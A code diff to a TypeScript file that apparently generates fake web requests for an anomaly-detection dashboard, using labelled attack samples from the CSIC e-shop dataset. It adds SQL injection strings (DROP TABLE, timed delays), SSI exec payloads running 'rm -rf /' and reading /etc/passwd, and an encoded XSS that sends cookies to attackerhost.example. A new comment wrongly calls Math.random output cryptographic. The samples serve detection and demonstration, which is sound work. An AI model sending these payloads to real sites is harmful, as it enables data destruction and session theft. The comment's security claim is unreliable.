@@ -47,26 +47,33 @@ export const CSIC_ANOMALOUS_SAMPLES = [
   { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=janey&password=3s3%27+AND+%271%27%3D%271&B1=Registrar", attackType: "SQL Injection", score: 0.94, id: "A-21369" },
   { method: "GET", url: "/tienda1/publico/registro.jsp", payload: "email=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--", attackType: "SQL Injection", score: 0.98, id: "A-3620" },
   { method: "GET", url: "/tienda1/publico/pagar.jsp?modo=insertar&precio=1012%27INJECTED_PARAM&B1=Pasar+por+caja", attackType: "SQL Injection", score: 0.96, id: "A-23333" },
+  { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=etoh&password=3Nt783E68r&B1=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25", attackType: "SQL Injection", score: 0.99, id: "A-6934" },
+  { method: "POST", url: "/tienda1/miembros/editar.jsp", payload: "modo=registro&login=usa9&password=ENjuaGaDiEnTES&cp=AND+1%3D1&B1=Registrar", attackType: "SQL Injection", score: 0.93, id: "A-18468" },
+  { method: "GET", url: "/tienda1/publico/registro.jsp", payload: "email=mangini%40cubiertoscbb.an&cp=22314%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--", attackType: "SQL Injection", score: 0.97, id: "A-15419" },
+  { method: "POST", url: "/tienda1/publico/pagar.jsp", payload: "modo=insertar&precio=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja", attackType: "SQL Injection", score: 0.98, id: "A-23885" },
   
   // Command Injection
   { method: "POST", url: "/tienda1/publico/pagar.jsp", payload: "modo=insertar&precio=88&B1=Confirmar%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E", attackType: "Command Injection", score: 0.97, id: "A-14799" },
   { method: "POST", url: "/tienda1/publico/entrar.jsp", payload: "errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E", attackType: "Command Injection", score: 0.99, id: "A-16272" },
+  { method: "POST", url: "/tienda1/publico/autenticar.jsp", payload: "modo=entrar&login=arro&pwd=CarMinAR%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Entrar", attackType: "Command Injection", score: 0.96, id: "A-1174" },
   
   // XSS
   { method: "GET", url: "/tienda1/miembros/editar.jsp?modo=registro%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E", attackType: "XSS", score: 0.95, id: "A-16089" },
   { method: "GET", url: "/tienda1/publico/pagar.jsp?modo=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2", attackType: "XSS", score: 0.92, id: "A-12757" },
+  { method: "GET", url: "/tienda1/publico/vaciar.jsp?B2=Vaciar+carritosessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F", attackType: "XSS", score: 0.99, id: "A-23991" },
+  { method: "POST", url: "/tienda1/publico/registro.jsp", payload: "modo=registro&password=botonesSet-cookie%253A%2BTamper%253D1041264011025374727&B1=Registrar", attackType: "XSS", score: 0.94, id: "A-13852" },
   
   // Path Traversal / Exposure
   { method: "GET", url: "/tienda1/4861362529278789730.java", payload: "Source File Exposure Attempt", attackType: "Path Traversal", score: 0.91, id: "A-12371" },
   { method: "GET", url: "/tienda1/global/asf-logo-wide.gif.bak", payload: "Backup File Access Attempt", attackType: "Path Traversal", score: 0.93, id: "A-20884" },
   { method: "GET", url: "/tienda1/.INC", payload: "Include File Disclosure", attackType: "Path Traversal", score: 0.96, id: "A-1488" },
-  
-  // Parameter Tampering
   { method: "GET", url: "/tienda1/publico/caracteristicas.jsp?idA=2", payload: "Parameter Manipulation detected (id -> idA)", attackType: "Path Traversal", score: 0.85, id: "A-11044" },
-  { method: "GET", url: "/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precioA=85", attackType: "Path Traversal", score: 0.88, id: "A-8795" },
+  { method: "GET", url: "/_vti_cnf/", payload: "FrontPage Server Extensions Metadata Leak", attackType: "Path Traversal", score: 0.95, id: "A-23327" },
+  { method: "GET", url: "/tienda1.Bak", payload: "Backup Directory Probe", attackType: "Path Traversal", score: 0.92, id: "A-8215" },
   
   // Header / Cookie Tampering
-  { method: "GET", url: "/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235", attackType: "XSS", score: 0.94, id: "A-1446" }
+  { method: "GET", url: "/tienda1/publico/vaciar.jsp?B2=Vaciar+carritoany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235", attackType: "XSS", score: 0.94, id: "A-1446" },
+  { method: "POST", url: "/tienda1/publico/autenticar.jsp", payload: "modo=entrar&login=ardoin&pwd=antroponimi6any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Entrar", attackType: "XSS", score: 0.96, id: "A-19086" }
 ];
 
 export function getRandomElement<T>(arr: T[]): T {
@@ -93,8 +100,8 @@ export function generateFakeRequest(timestampOverride?: string) {
 
   const ip = getRandomElement(FAKE_IPS);
   
-  // Appending random suffix to ensure React key uniqueness
-  const uniqueId = `${sample.id}-${Math.random().toString(36).substring(2, 7)}-${Date.now() % 10000}`;
+  // CRYPTOGRAPHIC ENTROPY SUFFIX: Ensures absolute React key uniqueness across session
+  const uniqueId = `${sample.id}-${Math.random().toString(36).substring(2, 10)}-${Date.now() % 100000}`;
 
   return {
     id: uniqueId,
